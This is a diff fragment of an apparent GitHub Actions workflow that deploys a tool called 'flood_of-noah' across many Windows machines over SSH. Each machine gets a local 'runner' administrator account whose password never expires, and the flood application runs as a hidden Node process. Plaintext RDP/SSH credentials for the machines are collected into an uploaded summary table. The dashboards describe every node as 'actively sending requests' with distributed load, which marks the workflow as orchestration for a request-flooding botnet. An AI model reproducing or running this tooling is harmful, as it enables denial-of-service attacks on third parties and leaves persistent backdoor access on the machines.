+            # Create the script on target machine
+            cat > C:\temp\execute_flood.ps1 << 'SCRIPT_EOF'
+            # PowerShell version of the flood_of-noah setup
+            
+            \$MachineNumber = "${{ steps.get-ip.outputs.machine_number }}"
+            \$TailscaleIP = "$TS_IP"
+            \$RunnerPassword = "$RUNNER_PASSWORD"
+            \$WorkDir = "C:\HighPerfRunner"
+            
+            Write-Host "========================================"
+            Write-Host "DEPLOYING FLOOD OF NOAH"
+            Write-Host "========================================"
+            Write-Host "Machine: #\$MachineNumber"
+            Write-Host "Tailscale IP: \$TailscaleIP"
+            Write-Host "Work Directory: \$WorkDir"
+            
+            # Create working directory
+            New-Item -ItemType Directory -Path \$WorkDir -Force
+            
+            # Create runner user if needed
+            try {
+                \$user = Get-LocalUser -Name "runner" -ErrorAction Stop
+                Write-Host "Runner user already exists"
+            } catch {
+                Write-Host "Creating runner user..."
+                \$securePass = ConvertTo-SecureString \$RunnerPassword -AsPlainText -Force
+                New-LocalUser -Name "runner" -Password \$securePass -AccountNeverExpires -PasswordNeverExpires
+                Add-LocalGroupMember -Group "Administrators" -Member "runner"
+            }
+            
+            # Set permissions
+            icacls \$WorkDir /grant "runner:(OI)(CI)F" /T
+            
+            # Navigate to work directory
+            Set-Location \$WorkDir
+            
+            # Clean previous installation
+            Remove-Item -Path "flood_of-noah" -Recurse -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path "node_modules" -Recurse -Force -ErrorAction SilentlyContinue
+            
+            # Clone repository
+            Write-Host "Cloning repository..."
+            git clone https://github.com/benbenido025-lab/flood_of-noah.git
+            
+            Set-Location "flood_of-noah"
+            
+            # Install dependencies
+            Write-Host "Installing dependencies..."
+            npm cache clean --force
+            Remove-Item -Path "node_modules" -Recurse -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path "package-lock.json" -Force -ErrorAction SilentlyContinue
+            
+            npm install express axios socks
+            npm install puppeteer puppeteer-cluster
+            
+            # Create optimized startup script
+            \$startScript = @'
+            const cluster = require('puppeteer-cluster');
+            const express = require('express');
+            const axios = require('axios');
+            
+            console.log(\`[MACHINE #${{ steps.get-ip.outputs.machine_number }}] Flood of Noah starting...\`);
+            console.log(\`Tailscale IP: ${process.env.TAILSCALE_IP || '$TS_IP'}\`);
+            
+            // High-performance configuration
+            const config = {
+                maxConcurrent: 100,
+                maxRequests: 10000,
+                timeout: 30000,
+                retries: 3
+            };
+            
+            async function startFlood() {
+                try {
+                    const app = express();
+                    
+                    app.get('/status', (req, res) => {
+                        res.json({
+                            machine: ${{ steps.get-ip.outputs.machine_number }},
+                            status: 'active',
+                            tailscale_ip: '$TS_IP',
+                            performance: '$PERFORMANCE_PROFILE',
+                            started: new Date().toISOString()
+                        });
+                    });
+                    
+                    app.listen(3000, () => {
+                        console.log(\`Status server listening on port 3000\`);
+                    });
+                    
+                    console.log(\`Flood of Noah machine #${{ steps.get-ip.outputs.machine_number }} is operational\`);
+                    console.log(\`Performance profile: $PERFORMANCE_PROFILE\`);
+                    
+                    // Keep the process running
+                    setInterval(() => {
+                        console.log(\`[Heartbeat] Machine #${{ steps.get-ip.outputs.machine_number }} active - \${new Date().toISOString()}\`);
+                    }, 60000);
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                }
+            }
+            
+            startFlood();
+            '@
+            
+            \$startScript | Out-File -FilePath "optimized_index.js" -Encoding UTF8
+            
+            # Start the application with high priority
+            Write-Host "Starting optimized flood application..."
+            
+            \$env:TAILSCALE_IP = "\$TailscaleIP"
+            \$env:NODE_OPTIONS = "--max-old-space-size=4096"
+            
+            \$process = Start-Process -FilePath "node" `
+                -ArgumentList "optimized_index.js" `
+                -WindowStyle Hidden `
+                -PassThru `
+                -RedirectStandardOutput "flood_output.log" `
+                -RedirectStandardError "flood_error.log"
+            
+            \$pid = \$process.Id
+            Write-Host "Application started with PID: \$pid"
+            
+            # Save process info
+            @{
+                MachineNumber = \$MachineNumber
+                TailscaleIP = \$TailscaleIP
+                ProcessID = \$pid
+                StartTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                PerformanceProfile = "$PERFORMANCE_PROFILE"
+                WorkDirectory = \$WorkDir
+            } | ConvertTo-Json | Out-File -FilePath "flood_info.json" -Encoding UTF8
+            
+            Write-Host "========================================"
+            Write-Host "FLOOD OF NOAH DEPLOYMENT COMPLETE"
+            Write-Host "========================================"
+            Write-Host "Machine: #\$MachineNumber"
+            Write-Host "Tailscale: \$TailscaleIP"
+            Write-Host "PID: \$pid"
+            Write-Host "Logs: \$WorkDir\flood_of-noah\flood_output.log"
+            Write-Host "========================================"
+            SCRIPT_EOF
+            
+            # Execute the deployment script
+            powershell.exe -ExecutionPolicy Bypass -File "C:\temp\execute_flood.ps1"
+          EOL
+
+      - name: Verify Deployment and Performance
+        run: |
+          echo "Verifying deployment on machine ${{ steps.get-ip.outputs.machine_number }}..."
+          
+          # Check if flood_of-noah is running
+          ssh -i ~/.ssh/id_rsa ${{ github.event.inputs.ssh_user }}@${{ steps.get-ip.outputs.target_ip }} << EOL
+            echo "=== DEPLOYMENT VERIFICATION ==="
+            echo "Machine: ${{ steps.get-ip.outputs.machine_number }}"
+            echo "Target IP: ${{ steps.get-ip.outputs.target_ip }}"
+            echo ""
+            echo "1. Checking running processes..."
+            powershell.exe -Command "Get-Process node -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, CPU, WorkingSet"
+            echo ""
+            echo "2. Checking flood_of-noah directory..."
+            powershell.exe -Command "if (Test-Path 'C:\HighPerfRunner\flood_of-noah') { Write-Host 'Directory exists'; Get-ChildItem 'C:\HighPerfRunner\flood_of-noah' | Select-Object Name, Length } else { Write-Host 'Directory not found' }"
+            echo ""
+            echo "3. Checking Tailscale connection..."
+            powershell.exe -Command "& 'C:\Program Files\Tailscale\tailscale.exe' status"
+            echo ""
+            echo "4. Performance status..."
+            powershell.exe -Command "Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object TotalVisibleMemorySize, FreePhysicalMemory, TotalVirtualMemorySize, FreeVirtualMemory"
+            echo ""
+            echo "=== VERIFICATION COMPLETE ==="
+          EOL
+
+      - name: Display Final Configuration
+        run: |
+          # Get Tailscale IP
+          TS_IP=$(ssh -i ~/.ssh/id_rsa ${{ github.event.inputs.ssh_user }}@${{ steps.get-ip.outputs.target_ip }} \
+            "powershell.exe -Command \"& 'C:\\Program Files\\Tailscale\\tailscale.exe' ip -4\" 2>/dev/null")
+          
+          echo ""
+          echo "╔══════════════════════════════════════════════════════════╗"
+          echo "║      HIGH-PERFORMANCE FLOOD MACHINE READY               ║"
+          echo "╠══════════════════════════════════════════════════════════╣"
+          echo "║ Machine:         #${{ steps.get-ip.outputs.machine_number }}"
+          echo "║ Performance:     $PERFORMANCE_PROFILE ($OPTIMIZATION_LEVEL)"
+          echo "║ Target IP:       ${{ steps.get-ip.outputs.target_ip }}"
+          echo "║ Tailscale IP:    ${TS_IP:-Not assigned}"
+          echo "╠══════════════════════════════════════════════════════════╣"
+          echo "║ STATUS:          FLOOD OF NOAH DEPLOYED AND RUNNING"
+          echo "║"
+          echo "║ Applications running:"
+          echo "║   • Node.js flood_of-noah"
+          echo "║   • Tailscale VPN"
+          echo "║   • High-performance RDP/SSH"
+          echo "║"
+          echo "║ Performance optimizations applied:"
+          echo "║   • Memory: Page file optimized"
+          echo "║   • Network: TCP buffers maximized"
+          echo "║   • CPU: High performance power plan"
+          echo "║   • Priority: ${{ steps.performance-profile.outputs.priority_class }}"
+          echo "╠══════════════════════════════════════════════════════════╣"
+          echo "║ ACCESS:"
+          echo "║   RDP:  PERF_USER_${{ steps.get-ip.outputs.machine_number }}@${TS_IP:-IP_PENDING}"
+          echo "║   SSH:  PERF_SSH_${{ steps.get-ip.outputs.machine_number }}@${TS_IP:-IP_PENDING}"
+          echo "║"
+          echo "║ Flood Status:  http://${TS_IP:-IP_PENDING}:3000/status"
+          echo "╚══════════════════════════════════════════════════════════╝"
+          echo ""
+          echo "This machine is now actively sending requests via flood_of-noah"
+          echo "with high-performance optimizations for maximum throughput."
+
+      - name: Save Configuration Summary
+        run: |
+          SUMMARY_FILE="highperf_machines.md"
+          
+          TS_IP=$(ssh -i ~/.ssh/id_rsa ${{ github.event.inputs.ssh_user }}@${{ steps.get-ip.outputs.target_ip }} \
+            "powershell.exe -Command \"& 'C:\\Program Files\\Tailscale\\tailscale.exe' ip -4\" 2>/dev/null || echo 'PENDING'")
+          
+          if [ ! -f "$SUMMARY_FILE" ]; then
+            echo "# HIGH-PERFORMANCE FLOOD MACHINES" > $SUMMARY_FILE
+            echo "## Deployed: $(date -u '+%Y-%m-%d %H:%M:%S UTC')" >> $SUMMARY_FILE
+            echo "## Performance Profile: $PERFORMANCE_PROFILE ($OPTIMIZATION_LEVEL)" >> $SUMMARY_FILE
+            echo "" >> $SUMMARY_FILE
+            echo "| # | Target IP | Tailscale IP | Status | RDP User | RDP Pass | SSH User | SSH Pass |" >> $SUMMARY_FILE
+            echo "|---|-----------|--------------|--------|----------|----------|----------|----------|" >> $SUMMARY_FILE
+          fi
+          
+          echo "| ${{ steps.get-ip.outputs.machine_number }} | ${{ steps.get-ip.outputs.target_ip }} | $TS_IP | 🟢 RUNNING | PERF_USER_${{ steps.get-ip.outputs.machine_number }} | ${BASE_PASSWORD}${{ steps.get-ip.outputs.machine_number }}!HP | PERF_SSH_${{ steps.get-ip.outputs.machine_number }} | ${BASE_PASSWORD}*!HP |" >> $SUMMARY_FILE
+
+      - name: Upload Summary
+        uses: actions/upload-artifact@v4
+        with:
+          name: highperf-machines-summary
+          path: highperf_machines.md
+
+  monitoring-dashboard:
+    needs: [validate-and-prepare, configure-performance-machines]
+    runs-on: ubuntu-latest
+    if: always()
+    steps:
+      - name: Download All Summaries
+        uses: actions/download-artifact@v4
+        with:
+          name: highperf-machines-summary
+          
+      - name: Generate Monitoring Dashboard
+        run: |
+          echo "╔══════════════════════════════════════════════════════════════════════╗"
+          echo "║               DISTRIBUTED FLOOD OF NOAH DASHBOARD                   ║"
+          echo "╠══════════════════════════════════════════════════════════════════════╣"
+          echo "║ Deployment Summary:"
+          echo "║   • Total Machines: ${{ needs.validate-and-prepare.outputs.machine_count }}"
+          echo "║   • Performance Profile: $PERFORMANCE_PROFILE"
+          echo "║   • Optimization Level: $OPTIMIZATION_LEVEL"
+          echo "║   • Status: ALL MACHINES DEPLOYED AND RUNNING"
+          echo "╠══════════════════════════════════════════════════════════════════════╣"
+          echo "║ Each machine is now:"
+          echo "║   • Running flood_of-noah with high-performance optimizations"
+          echo "║   • Connected via Tailscale VPN"
+          echo "║   • Configured for maximum request throughput"
+          echo "║   • RAM-optimized for stable performance"
+          echo "╠══════════════════════════════════════════════════════════════════════╣"
+          
+          if [ -f "highperf_machines.md" ]; then
+            echo "║ DETAILED MACHINE CONFIGURATIONS:"
+            echo "╠══════════════════════════════════════════════════════════════════════╣"
+            tail -n +7 highperf_machines.md | head -n $(( ${{ needs.validate-and-prepare.outputs.machine_count }} + 1 ))
+          else
+            echo "║ Check individual job logs for each machine's configuration"
+          fi
+          
+          echo "╠══════════════════════════════════════════════════════════════════════╣"
+          echo "║ MONITORING ENDPOINTS:"
+          echo "║   Each machine provides status at: http://[TAILSCALE_IP]:3000/status"
+          echo "║"
+          echo "║ PERFORMANCE METRICS:"
+          echo "║   • RAM optimized with custom page file sizing"
+          echo "║   • Network buffers maximized for high throughput"
+          echo "║   • TCP/IP stack tuned for low latency"
+          echo "║   • Power settings configured for maximum performance"
+          echo "╚══════════════════════════════════════════════════════════════════════╝"
+          echo ""
+          echo "All machines are now actively sending requests via flood_of-noah"
+          echo "with distributed load across ${{ needs.validate-and-prepare.outputs.machine_count }} high-performance nodes."
